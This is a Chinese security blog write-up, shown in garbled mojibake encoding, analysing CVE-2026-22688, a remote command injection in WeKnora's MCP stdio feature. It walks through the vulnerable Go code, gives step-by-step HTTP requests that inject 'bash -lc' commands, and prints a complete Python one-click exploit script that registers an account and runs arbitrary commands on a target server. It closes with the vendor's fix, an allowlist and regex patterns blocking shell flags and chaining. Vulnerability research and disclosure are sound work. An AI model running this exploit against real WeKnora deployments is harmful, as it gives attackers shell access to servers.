#  CVE-2026-22688 - è…¾è®¯WeKnora MCP Stdio å‘½ä»¤æ³¨å…¥æ¼æ´  
dmd5å®‰å…¨
                    dmd5å®‰å…¨  dmd5å®‰å…¨   2026-01-15 08:38  
  
## ä¸€ã€æ¼æ´æè¿°  
## WeKnora æ˜¯ä¸€ä¸ªåŸºäºå¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„æ¡†æ¶ï¼Œä¸“ä¸ºæ·±åº¦æ–‡æ¡£ç†è§£å’Œè¯­ä¹‰æ£€ç´¢è€Œè®¾è®¡ï¼Œå°¤å…¶é€‚ç”¨äºå¤„ç†å¤æ‚ã€å¼‚æ„æ–‡æ¡£ã€‚  
##   
## å®ƒé‡‡ç”¨æ¨¡å—åŒ–æ¶æ„ï¼Œç»“åˆäº†å¤šæ¨¡æ€é¢„å¤„ç†ã€è¯­ä¹‰å‘é‡ç´¢å¼•ã€æ™ºèƒ½æ£€ç´¢å’Œå¤§å‹è¯­è¨€æ¨¡å‹æ¨ç†ã€‚WeKnora çš„æ ¸å¿ƒéµå¾ª RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ èŒƒå¼ï¼Œé€šè¿‡å°†ç›¸å…³æ–‡æ¡£å—ä¸æ¨¡å‹æ¨ç†ç›¸ç»“åˆï¼Œå®ç°é«˜è´¨é‡ã€ä¸Šä¸‹æ–‡æ„ŸçŸ¥æ€§çš„ç­”æ¡ˆã€‚  
##   
## WeKnora åœ¨ 0.2.5 ç‰ˆæœ¬ä¹‹å‰ï¼Œå½“ç”¨æˆ·åˆ›å»ºæˆ–æ›´æ–° MCP æœåŠ¡æ—¶ï¼Œå¦‚æœä¼ è¾“ç±»å‹é€‰æ‹© stdioï¼Œç³»ç»Ÿç›´æ¥å°†ç”¨æˆ·æäº¤çš„ command å’Œ args å‚æ•°ä¼ é€’ç»™ exec.Command() æ‰§è¡Œï¼Œæœªè¿›è¡Œä»»ä½•å®‰å…¨éªŒè¯ã€‚  
## æ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‡å®šä»»æ„å‘½ä»¤ï¼ˆå¦‚ bashã€shï¼‰åŠå…¶å‚æ•°ï¼Œåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œæ¶æ„ç³»ç»Ÿå‘½ä»¤ã€‚ç”±äºæœåŠ¡é€šå¸¸ä»¥å®¹å™¨åŒ–æ–¹å¼éƒ¨ç½²ï¼Œæ”»å‡»è€…å¯è·å¾—å®¹å™¨å†…çš„ shell è®¿é—®æƒé™ï¼Œè¿›ä¸€æ­¥å¯èƒ½é€ƒé€¸åˆ°å®¿ä¸»æœºã€‚äºŒã€ç¯å¢ƒæ­å»ºè½¯ä»¶ç‰ˆæœ¬: WeKnora 0.2.3 (æ¼æ´ç‰ˆæœ¬)éƒ¨ç½²æ–¹å¼: Docker Composeæµ‹è¯•ç¯å¢ƒ: macOS / LinuxGo ç‰ˆæœ¬: 1.24éƒ¨ç½²æ­¥éª¤# 1. ä¸‹è½½æ¼æ´ç‰ˆæœ¬æºç cdÂ /Users/liaojialin.6/Downloads/WeKnora-0.2.3# 2.******* è¿™é‡Œæˆ‘éœ€è¦ä½¿ç”¨ä»£ç†ï¼Œä¸ç„¶æˆ‘è¿™é‡Œä¸€ç›´ä¼šæŠ¥é”™ï¼Œä½¿ç”¨ä»£ç†å°±å¥½äº†dockerÂ compose build --build-arg GOPROXY_ARG=https://goproxy.cn,direct --build-arg APK_MIRROR_ARG= app# 3. ç„¶åå¯åŠ¨æ‰€æœ‰çš„æœåŠ¡dockerÂ compose up -d postgres redis docreader appéªŒè¯  
  
ä¸‰ã€æ¼æ´åˆ†æ/ä»£ç åˆ†æ  
  
æ¼æ´è§¦å‘é“¾è·¯  
  
å…ˆçœ‹é“¾è·¯ï¼Œå…ˆæ‡‚æ•´ä½“æµç¨‹åï¼Œç„¶åå†å»åˆ†æä»£ç ï¼Œå°±ä¼šæ–¹ä¾¿å¾ˆå¤šäº†  
```
ç”¨æˆ·è¯·æ±‚ (POST /api/v1/mcp-services)
Â  Â  â†“
CreateMCPService Handler (mcp_service.go:28)
Â  Â  â†“
éªŒè¯ TenantIDï¼Œç»‘å®š JSON åˆ° MCPService ç»“æ„ä½“
Â  Â  â†“
è°ƒç”¨ mcpServiceService.CreateMCPService() å­˜å…¥æ•°æ®åº“
Â  Â  â†“
ç”¨æˆ·è¯·æ±‚æµ‹è¯•è¿æ¥ (POST /api/v1/mcp-services/{id}/test)
Â  Â  â†“
TestMCPService Handler (mcp_service.go:258)
Â  Â  â†“
è°ƒç”¨ mcpServiceService.TestMCPService()
Â  Â  â†“
è°ƒç”¨ mcp.NewMCPClient() åˆ›å»ºå®¢æˆ·ç«¯
Â  Â  â†“
ã€æ¼æ´ç‚¹ã€‘client.NewStdioMCPClientWithOptions() ç›´æ¥æ‰§è¡Œç”¨æˆ·å‘½ä»¤Â 
```  
  
ä»£ç åˆ†æ  
  
ç›´æ¥å®šä½åˆ°å’Œ MCP ç›¸å…³çš„ä»£ç éƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯å®¢æˆ·ç«¯ä»£ç ï¼Œä¸€ä¸ªæœåŠ¡ç«¯ä»£ç   
  
  
å®¢æˆ·ç«¯ä»£ç   
  
å…¶å®æ ¸å¿ƒå°±æ˜¯å‚æ•°ä¼ é€’çš„è¿‡ç¨‹ä¸­ï¼Œè§£æé—®é¢˜ï¼Œå¦‚æœæ²¡æœ‰å¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åšä»»ä½•è¿‡æ»¤ï¼Œåœ¨å®¢æˆ·ç«¯è°ƒç”¨çš„è¿‡ç¨‹ä¸­ç›´æ¥æ‰§è¡Œ  
  
  
NewMCPClient å‡½æ•°ï¼š  
```
// NewMCPClient creates a new MCP client based on the transport type
funcÂ NewMCPClient(config *ClientConfig)Â (MCPClient,Â error) {
Â  Â Â // ... çœç•¥ HTTP client å’Œ headers æ„å»ºä»£ç  ...

Â  Â Â // Create client based on transport type
Â  Â Â varÂ mcpClient *client.Client
Â  Â Â varÂ errÂ error
Â  Â Â switchÂ config.Service.TransportType {
Â  Â Â caseÂ types.MCPTransportSSE:
Â  Â  Â  Â Â // SSE ä¼ è¾“ç±»å‹å¤„ç†...
Â  Â  Â  Â  mcpClient, err = client.NewSSEMCPClient(*config.Service.URL,
Â  Â  Â  Â  Â  Â  client.WithHTTPClient(httpClient),
Â  Â  Â  Â  Â  Â  client.WithHeaders(headers),
Â  Â  Â  Â  )
Â  Â  Â  Â Â ifÂ err !=Â nilÂ {
Â  Â  Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("failed to create SSE client: %w", err)
Â  Â  Â  Â  }
Â  Â Â caseÂ types.MCPTransportHTTPStreamable:
Â  Â  Â  Â Â // HTTP Streamable ä¼ è¾“ç±»å‹å¤„ç†...
Â  Â  Â  Â  mcpClient, err = client.NewStreamableHttpClient(*config.Service.URL,
Â  Â  Â  Â  Â  Â  transport.WithHTTPBasicClient(httpClient),
Â  Â  Â  Â  Â  Â  transport.WithHTTPHeaders(headers),
Â  Â  Â  Â  )
Â  Â  Â  Â Â ifÂ err !=Â nilÂ {
Â  Â  Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("failed to create HTTP streamable client: %w", err)
Â  Â  Â  Â  }
Â  Â Â caseÂ types.MCPTransportStdio:
Â  Â  Â  Â Â ifÂ config.Service.StdioConfig ==Â nilÂ {
Â  Â  Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("stdio_config is required for stdio transport")
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Convert env vars map to []string format (KEY=value)
Â  Â  Â  Â  envVars :=Â make([]string,Â 0,Â len(config.Service.EnvVars))
Â  Â  Â  Â Â forÂ key, value :=Â rangeÂ config.Service.EnvVars {
Â  Â  Â  Â  Â  Â  envVars =Â append(envVars, fmt.Sprintf("%s=%s", key, value))
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Create stdio client with options
Â  Â  Â  Â Â // NewStdioMCPClientWithOptions(command string, env []string, args []string, opts ...transport.StdioOption)
Â  Â  Â  Â Â // ğŸ”´ æ¼æ´ç‚¹ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„ command å’Œ argsï¼Œæ— ä»»ä½•éªŒè¯ï¼
Â  Â  Â  Â  mcpClient, err = client.NewStdioMCPClientWithOptions(
Â  Â  Â  Â  Â  Â  config.Service.StdioConfig.Command, Â // â† å®Œå…¨ç”±ç”¨æˆ·æ§åˆ¶
Â  Â  Â  Â  Â  Â  envVars,
Â  Â  Â  Â  Â  Â  config.Service.StdioConfig.Args, Â  Â Â // â† å®Œå…¨ç”±ç”¨æˆ·æ§åˆ¶
Â  Â  Â  Â  )
Â  Â  Â  Â Â ifÂ err !=Â nilÂ {
Â  Â  Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("failed to create stdio client: %w", err)
Â  Â  Â  Â  }
Â  Â Â default:
Â  Â  Â  Â Â returnÂ nil, ErrUnsupportedTransport
Â  Â  }

Â  Â Â returnÂ &mcpGoClient{
Â  Â  Â  Â  service: config.Service,
Â  Â  Â  Â  client: Â mcpClient,
Â  Â  },Â nil
}
```  
  
åˆ›å»º MCP æœåŠ¡çš„ API å…¥å£  
  
æ–‡ä»¶ä½ç½®: internal/handler/mcp_service.go  
  
å®Œæ•´çš„ CreateMCPService å‡½æ•°ï¼š  
  
æ ¸å¿ƒé—®é¢˜éƒ½åœ¨æ³¨é‡Šä¸­æ ‡æ³¨å‡ºæ¥äº†ï¼Œåˆ›å»º MCP æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è§£æçš„æ—¶å€™ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•éªŒè¯  
```
// POST /api/mcp-services
funcÂ (h *MCPServiceHandler)Â CreateMCPService(c *gin.Context) {
Â  Â  ctx := c.Request.Context()

Â  Â Â varÂ service types.MCPService
Â  Â Â // ğŸ”´ ç›´æ¥å°† JSON è¯·æ±‚ä½“ç»‘å®šåˆ°ç»“æ„ä½“ï¼Œæ— ä»»ä½•éªŒè¯
Â  Â Â ifÂ err := c.ShouldBindJSON(&service); err != nil {
Â  Â  Â  Â  logger.Error(ctx,Â "Failed to parse MCP service request", err)
Â  Â  Â  Â  c.Error(errors.NewBadRequestError(err.Error()))
Â  Â  Â  Â Â return
Â  Â  }

Â  Â  tenantID := c.GetUint64(types.TenantIDContextKey.String())
Â  Â Â ifÂ tenantID ==Â 0Â {
Â  Â  Â  Â  logger.Error(ctx,Â "Tenant ID is empty")
Â  Â  Â  Â  c.Error(errors.NewBadRequestError("Tenant ID cannot be empty"))
Â  Â  Â  Â Â return
Â  Â  }
Â  Â  service.TenantIDÂ = tenantID

Â  Â Â // ğŸ”´ ç›´æ¥è°ƒç”¨æœåŠ¡å±‚åˆ›å»ºï¼Œæœªå¯¹ stdio_config.command/args è¿›è¡Œå®‰å…¨æ£€æŸ¥
Â  Â Â ifÂ err := h.mcpServiceService.CreateMCPService(ctx, &service); err != nil {
Â  Â  Â  Â  logger.ErrorWithFields(ctx, err, map[string]interface{}{"service_name": secutils.SanitizeForLog(service.Name)})
Â  Â  Â  Â  c.Error(errors.NewInternalServerError("Failed to create MCP service: "Â + err.Error()))
Â  Â  Â  Â Â return
Â  Â  }

Â  Â  c.JSON(http.StatusOK, gin.H{
Â  Â  Â  Â Â "success":Â true,
Â  Â  Â  Â Â "data": Â  Â service,
Â  Â  })
}
```  
  
æœåŠ¡å±‚æµ‹è¯•é€»è¾‘  
  
æ–‡ä»¶ä½ç½®: internal/application/service/mcp_service.go  
  
TestMCPService å‡½æ•°ï¼š  
```
// TestMCPService tests the connection to an MCP service and returns available tools/resources
funcÂ (s *mcpServiceService)Â TestMCPService(
Â  Â  ctx context.Context,
Â  Â  tenantIDÂ uint64,
Â  Â  idÂ string,
) (*types.MCPTestResult,Â error) {
Â  Â Â // Get service
Â  Â  service, err := s.mcpServiceRepo.GetByID(ctx, tenantID, id)
Â  Â Â ifÂ err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("failed to get MCP service: %w", err)
Â  Â  }
Â  Â Â ifÂ service ==Â nilÂ {
Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("MCP service not found")
Â  Â  }

Â  Â Â // Create temporary client for testing
Â  Â  config := &mcp.ClientConfig{
Â  Â  Â  Â  Service: service, Â // Â æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„æ¶æ„ command/args
Â  Â  }

Â  Â Â // ğŸ”´ è°ƒç”¨ mcp.NewMCPClient()ï¼Œè¿™é‡Œä¼šæ‰§è¡Œç”¨æˆ·å‘½ä»¤
Â  Â  client, err := mcp.NewMCPClient(config)
Â  Â Â ifÂ err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ &types.MCPTestResult{
Â  Â  Â  Â  Â  Â  Success:Â false,
Â  Â  Â  Â  Â  Â  Message: fmt.Sprintf("Failed to create client: %v", err),
Â  Â  Â  Â  },Â nil
Â  Â  }

Â  Â Â // Connect
Â  Â  testCtx, cancel := context.WithTimeout(ctx,Â 30*time.Second)
Â  Â Â deferÂ cancel()

Â  Â Â // ğŸ”´ client.Connect() å†…éƒ¨è°ƒç”¨ Start()ï¼ŒçœŸæ­£æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹
Â  Â Â ifÂ err := client.Connect(testCtx); err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ &types.MCPTestResult{
Â  Â  Â  Â  Â  Â  Success:Â false,
Â  Â  Â  Â  Â  Â  Message: fmt.Sprintf("Connection failed: %v", err),
Â  Â  Â  Â  },Â nil
Â  Â  }
Â  Â Â deferÂ client.Disconnect()
}
```  
  
å‘½ä»¤æ‰§è¡Œçš„æ ¸å¿ƒä»£ç   
  
æ–‡ä»¶ä½ç½®: internal/mcp/client.go  
  
NewMCPClient å‡½æ•°ä¸­çš„ stdio å¤„ç†éƒ¨åˆ†ï¼š  
```
caseÂ types.MCPTransportStdio:
Â  Â Â ifÂ config.Service.StdioConfig ==Â nilÂ {
Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("stdio_config is required for stdio transport")
Â  Â  }

Â  Â Â // Convert env vars map to []string format (KEY=value)
Â  Â  envVars :=Â make([]string,Â 0,Â len(config.Service.EnvVars))
Â  Â Â forÂ key, value :=Â rangeÂ config.Service.EnvVars {
Â  Â  Â  Â  envVars =Â append(envVars, fmt.Sprintf("%s=%s", key, value))
Â  Â  }

Â  Â Â // Create stdio client with options
Â  Â Â // NewStdioMCPClientWithOptions(command string, env []string, args []string, opts ...transport.StdioOption)
Â  Â Â // ğŸ”´ æ¼æ´ç‚¹ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„ command å’Œ argsï¼Œæ— ä»»ä½•éªŒè¯ï¼
Â  Â  mcpClient, err = client.NewStdioMCPClientWithOptions(
Â  Â  Â  Â  config.Service.StdioConfig.Command, Â // â† å®Œå…¨ç”±ç”¨æˆ·æ§åˆ¶
Â  Â  Â  Â  envVars,
Â  Â  Â  Â  config.Service.StdioConfig.Args, Â  Â Â // â† å®Œå…¨ç”±ç”¨æˆ·æ§åˆ¶
Â  Â  )
Â  Â Â ifÂ err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ nil, fmt.Errorf("failed to create stdio client: %w", err)
Â  Â  }
```  
  
Connect å‡½æ•°ï¼š  
```
// Connect establishes connection to the MCP service
funcÂ (c *mcpGoClient)Â Connect(ctx context.Context)Â errorÂ {
Â  Â Â ifÂ c.connected {
Â  Â  Â  Â Â returnÂ ErrAlreadyConnected
Â  Â  }

Â  Â Â // ğŸ”´ Start the client - è¿™é‡ŒçœŸæ­£æ‰§è¡Œç”¨æˆ·å‘½ä»¤ï¼
Â  Â Â ifÂ err := c.client.Start(ctx); err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ fmt.Errorf("failed to start client: %w", err)
Â  Â  }

Â  Â  c.connected =Â true
Â  Â Â ifÂ c.service.TransportType == types.MCPTransportStdio {
Â  Â  Â  Â  logger.GetLogger(ctx).Infof("MCP stdio client connected: %s %v",
Â  Â  Â  Â  Â  Â  c.service.StdioConfig.Command, c.service.StdioConfig.Args)
Â  Â  }Â elseÂ {
Â  Â  Â  Â  logger.GetLogger(ctx).Infof("MCP client connected to %s", *c.service.URL)
Â  Â  }
Â  Â Â returnÂ nil
}
```  
  
  
å››ã€æ¼æ´å¤ç°  
  
æ­¥éª¤ 1: æ³¨å†Œç”¨æˆ·è´¦å·  
```
POSTÂ /api/v1/auth/registerÂ HTTP/1.1
Host:Â localhost:8080
Content-Type:Â application/json

{
Â Â "username":Â "attacker",
Â Â "email":Â "attacker@test.com",
Â Â "password":Â "Attacker123"
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I4icpCrZAl8wG4p7756k4tK9I7KGaF9KOLPwAquya5QstjNqk3aGGltbvUZck8nALccPhHBb4ltnPA/640?wx_fmt=png&from=appmsg "")  
  
ç„¶åæˆ‘ä»¬å»ç™»å½•  
  
  
æ­¥éª¤ 2: ç™»å½•è·å– Token  
```
POSTÂ /api/v1/auth/loginÂ HTTP/1.1
Host:Â localhost:8080
Content-Type:Â application/json

{
Â Â "email":Â "attacker@test.com",
Â Â "password":Â "Attacker123"
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I4icpCrZAl8wG4p7756k4tK9JFN9kLoLNBTKOicb6MEZ2RJ31pcendIFUmRfwc6zCusz9S29GTYOUvA/640?wx_fmt=png&from=appmsg "")  
  
æœ‰äº†ç”¨æˆ·æˆ‘ä»¬å°±å¯ä»¥åˆ›å»º MCP æœåŠ¡å™¨äº†  
  
  
æ­¥éª¤ 3: åˆ›å»ºæ¶æ„ MCP æœåŠ¡  
```
POSTÂ /api/v1/mcp-servicesÂ HTTP/1.1
Host:Â localhost:8080
Authorization:Â Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImF0dGFja2VyQHRlc3QuY29tIiwiZXhwIjoxNzY4MTIzMjM3LCJpYXQiOjE3NjgwMzY4MzcsInRlbmFudF9pZCI6MTAwMDMsInR5cGUiOiJhY2Nlc3MiLCJ1c2VyX2lkIjoiMTJlNjg3YzMtNTkzNS00MTY1LTk4NjItODhhOTY4ZDM3YzhlIn0.5IgEJQAxgf5xketuZBs1F-r7PkFUfWZiTJeMJSTpmXM
Content-Type:Â application/json
Content-Length:Â 252

{
Â  Â Â "name":Â "rce",
Â  Â Â "description":Â "rce",
Â  Â Â "enabled":Â true,
Â  Â Â "transport_type":Â "stdio",
Â  Â Â "stdio_config":Â {
Â  Â  Â Â "command":Â "bash",
Â  Â  Â Â "args":Â ["-lc",Â "id > /tmp/RCE_ok.txt && uname -a >> /tmp/RCE_ok.txt"]
Â  Â Â },
Â  Â Â "env_vars":Â {}
Â Â }Â 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I4icpCrZAl8wG4p7756k4tK9s7RXVmqqVAMOjTX3Evn5ZdVOppK6QMnWJ8ia9mgTyVxebxBcrvRrfTQ/640?wx_fmt=png&from=appmsg "")  
  
  
æ­¥éª¤ 4: è§¦å‘å‘½ä»¤æ‰§è¡Œ  
```
POSTÂ /api/v1/mcp-services/f41aa229-b1c7-4f8e-ab25-204751f6693f/testÂ HTTP/1.1
Host:Â localhost:8080
Authorization:Â Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImF0dGFja2VyQHRlc3QuY29tIiwiZXhwIjoxNzY4MTIzMjM3LCJpYXQiOjE3NjgwMzY4MzcsInRlbmFudF9pZCI6MTAwMDMsInR5cGUiOiJhY2Nlc3MiLCJ1c2VyX2lkIjoiMTJlNjg3YzMtNTkzNS00MTY1LTk4NjItODhhOTY4ZDM3YzhlIn0.5IgEJQAxgf5xketuZBs1F-r7PkFUfWZiTJeMJSTpmXM
Content-Type:Â application/json
Content-Length:Â 252
```  
  
è¿™éƒ¨å“åº”ä¼šè¶…æ—¶ï¼Œæ˜¯æ­£å¸¸çš„  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I4icpCrZAl8wG4p7756k4tK9kbk6sfVh53pnO5Ttr3KaTKh5Iic2BRXN1sk5G6vNGWJq4ibEzcnaz48w/640?wx_fmt=png&from=appmsg "")  
  
  
æ­¥éª¤ 5: éªŒè¯å‘½ä»¤æ‰§è¡Œç»“æœ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I4icpCrZAl8wG4p7756k4tK9cgzsEgunXeTesPcKQPmOmtkAiczDNBZt6Ro0ia54zTuz8Hdibd3nK3KBg/640?wx_fmt=png&from=appmsg "")  
  
  
  
ä¸€é”®åˆ©ç”¨è„šæœ¬  
  
æ–‡ä»¶: exploit_weknora_rce.py  
```
#!/usr/bin/env python3
"""
CVE-2026-22688 - WeKnora MCP Stdio Command Injection Exploit

æ¼æ´å½±å“: WeKnora < 0.2.5
åˆ©ç”¨æ¡ä»¶: éœ€è¦å·²è®¤è¯ç”¨æˆ·è´¦å·
"""

importÂ requests
importÂ sys
importÂ json

classÂ WeKnoraExploit:
Â  Â Â defÂ __init__(self, target_url):
Â  Â  Â  Â Â self.target_url = target_url.rstrip('/')
Â  Â  Â  Â Â self.session = requests.Session()
Â  Â  Â  Â Â self.token =Â None

Â  Â Â defÂ register(self, username, email, password):
Â  Â  Â  Â Â """æ³¨å†Œç”¨æˆ·"""
Â  Â  Â  Â  url =Â f"{self.target_url}/api/v1/auth/register"
Â  Â  Â  Â  data = {
Â  Â  Â  Â  Â  Â Â "username": username,
Â  Â  Â  Â  Â  Â Â "email": email,
Â  Â  Â  Â  Â  Â Â "password": password
Â  Â  Â  Â  }
Â  Â  Â  Â  resp =Â self.session.post(url, json=data)
Â  Â  Â  Â Â ifÂ resp.status_code ==Â 201:
Â  Â  Â  Â  Â  Â Â print(f"[+] æ³¨å†ŒæˆåŠŸ:Â {email}")
Â  Â  Â  Â  Â  Â Â returnÂ True
Â  Â  Â  Â Â print(f"[-] æ³¨å†Œå¤±è´¥:Â {resp.text}")
Â  Â  Â  Â Â returnÂ False

Â  Â Â defÂ login(self, email, password):
Â  Â  Â  Â Â """ç™»å½•è·å– Token"""
Â  Â  Â  Â  url =Â f"{self.target_url}/api/v1/auth/login"
Â  Â  Â  Â  data = {"email": email,Â "password": password}
Â  Â  Â  Â  resp =Â self.session.post(url, json=data)
Â  Â  Â  Â Â ifÂ resp.status_code ==Â 200:
Â  Â  Â  Â  Â  Â  result = resp.json()
Â  Â  Â  Â  Â  Â Â self.token = result.get('token')
Â  Â  Â  Â  Â  Â Â print(f"[+] ç™»å½•æˆåŠŸï¼Œè·å– Token")
Â  Â  Â  Â  Â  Â Â returnÂ True
Â  Â  Â  Â Â print(f"[-] ç™»å½•å¤±è´¥:Â {resp.text}")
Â  Â  Â  Â Â returnÂ False

Â  Â Â defÂ create_mcp_service(self, command, args):
Â  Â  Â  Â Â """åˆ›å»ºæ¶æ„ MCP æœåŠ¡"""
Â  Â  Â  Â  url =Â f"{self.target_url}/api/v1/mcp-services"
Â  Â  Â  Â  headers = {"Authorization":Â f"BearerÂ {self.token}"}
Â  Â  Â  Â  data = {
Â  Â  Â  Â  Â  Â Â "name":Â "exploit",
Â  Â  Â  Â  Â  Â Â "description":Â "exploit",
Â  Â  Â  Â  Â  Â Â "enabled":Â True,
Â  Â  Â  Â  Â  Â Â "transport_type":Â "stdio",
Â  Â  Â  Â  Â  Â Â "stdio_config": {
Â  Â  Â  Â  Â  Â  Â  Â Â "command": command,
Â  Â  Â  Â  Â  Â  Â  Â Â "args": args
Â  Â  Â  Â  Â  Â  },
Â  Â  Â  Â  Â  Â Â "env_vars": {}
Â  Â  Â  Â  }
Â  Â  Â  Â  resp =Â self.session.post(url, json=data, headers=headers)
Â  Â  Â  Â Â ifÂ resp.status_code ==Â 200:
Â  Â  Â  Â  Â  Â  result = resp.json()
Â  Â  Â  Â  Â  Â  service_id = result['data']['id']
Â  Â  Â  Â  Â  Â Â print(f"[+] æ¶æ„ MCP æœåŠ¡åˆ›å»ºæˆåŠŸï¼ŒID:Â {service_id}")
Â  Â  Â  Â  Â  Â Â returnÂ service_id
Â  Â  Â  Â Â print(f"[-] åˆ›å»º MCP æœåŠ¡å¤±è´¥:Â {resp.text}")
Â  Â  Â  Â Â returnÂ None

Â  Â Â defÂ trigger_execution(self, service_id):
Â  Â  Â  Â Â """è§¦å‘å‘½ä»¤æ‰§è¡Œ"""
Â  Â  Â  Â  url =Â f"{self.target_url}/api/v1/mcp-services/{service_id}/test"
Â  Â  Â  Â  headers = {"Authorization":Â f"BearerÂ {self.token}"}
Â  Â  Â  Â  resp =Â self.session.post(url, headers=headers)
Â  Â  Â  Â Â print(f"[+] è§¦å‘å‘½ä»¤æ‰§è¡Œ:Â {resp.text}")
Â  Â  Â  Â Â returnÂ resp.status_code ==Â 200

Â  Â Â defÂ execute_command(self, command, args):
Â  Â  Â  Â Â """æ‰§è¡Œä»»æ„å‘½ä»¤"""
Â  Â  Â  Â Â ifÂ notÂ self.token:
Â  Â  Â  Â  Â  Â Â print("[-] è¯·å…ˆç™»å½•")
Â  Â  Â  Â  Â  Â Â returnÂ False

Â  Â  Â  Â  service_id =Â self.create_mcp_service(command, args)
Â  Â  Â  Â Â ifÂ service_id:
Â  Â  Â  Â  Â  Â Â returnÂ self.trigger_execution(service_id)
Â  Â  Â  Â Â returnÂ False


defÂ main():
Â  Â Â ifÂ len(sys.argv) <Â 2:
Â  Â  Â  Â Â print(f"ç”¨æ³•:Â {sys.argv[0]}Â <target_url> [command] [args...]")
Â  Â  Â  Â Â print(f"ç¤ºä¾‹:Â {sys.argv[0]}Â http://localhost:8080 'bash' '-c' 'id > /tmp/pwned.txt'")
Â  Â  Â  Â  sys.exit(1)

Â  Â  target_url = sys.argv[1]
Â  Â  exploit = WeKnoraExploit(target_url)

Â  Â Â # æ³¨å†Œæˆ–ç™»å½•
Â  Â  email =Â "attacker@test.com"
Â  Â  password =Â "Attacker123"
Â  Â  exploit.register("attacker", email, password)
Â  Â  exploit.login(email, password)

Â  Â Â # æ‰§è¡Œå‘½ä»¤
Â  Â Â ifÂ len(sys.argv) >=Â 4:
Â  Â  Â  Â  command = sys.argv[2]
Â  Â  Â  Â  args = sys.argv[3:]
Â  Â Â else:
Â  Â  Â  Â Â # é»˜è®¤å‘½ä»¤
Â  Â  Â  Â  command =Â "bash"
Â  Â  Â  Â  args = ["-lc",Â "id > /tmp/RCE_ok.txt && uname -a >> /tmp/RCE_ok.txt"]

Â  Â Â print(f"[*] æ‰§è¡Œå‘½ä»¤:Â {command}Â {' '.join(args)}")
Â  Â  exploit.execute_command(command, args)
Â  Â Â print("[+] åˆ©ç”¨å®Œæˆï¼Œè¯·éªŒè¯å‘½ä»¤æ‰§è¡Œç»“æœ")


ifÂ __name__ ==Â "__main__":
Â  Â  main()
```  
  
  
äº”ã€æ¼æ´ä¿®å¤  
  
ä¿®å¤ç‰ˆæœ¬: WeKnora >= 0.2.5  
  
å®˜æ–¹åœ¨ commit f7900a5e9a18c99d25cec9589ead9e4e59ce04bb ä¸­æ·»åŠ äº†å®Œæ•´çš„è¾“å…¥éªŒè¯æœºåˆ¶ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I4icpCrZAl8wG4p7756k4tK9ona1J5sMtsEWqHjhLRTRwhfZQiciaM0BBdPJGlBGqYzdIUj5a9xedXJA/640?wx_fmt=png&from=appmsg "")  
  
  
internal/utils/security.go  
```
// AllowedStdioCommands defines the whitelist of allowed commands for MCP stdio transport
// These are the standard MCP server launchers that are considered safe
varÂ AllowedStdioCommands =Â map[string]bool{
Â  Â Â "uvx":Â true,Â // Python package runner (uv)
Â  Â Â "npx":Â true,Â // Node.js package runner
}

// DangerousArgPatterns contains patterns that indicate potentially dangerous arguments
varÂ DangerousArgPatterns = []*regexp.Regexp{
Â  Â  regexp.MustCompile(`(?i)^-c$`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Shell command execution flag
Â  Â  regexp.MustCompile(`(?i)^--command$`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â // Shell command execution flag
Â  Â  regexp.MustCompile(`(?i)^-e$`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Eval flag
Â  Â  regexp.MustCompile(`(?i)^--eval$`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Eval flag
Â  Â  regexp.MustCompile(`(?i)[;&|]`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â // Shell command chaining
Â  Â  regexp.MustCompile(`(?i)\$\(`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Command substitution
Â  Â  regexp.MustCompile("(?i)`"), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â // Backtick command substitution
Â  Â  regexp.MustCompile(`(?i)>\s*[/~]`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Output redirection to absolute/home path
Â  Â  regexp.MustCompile(`(?i)<\s*[/~]`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Input redirection from absolute/home path
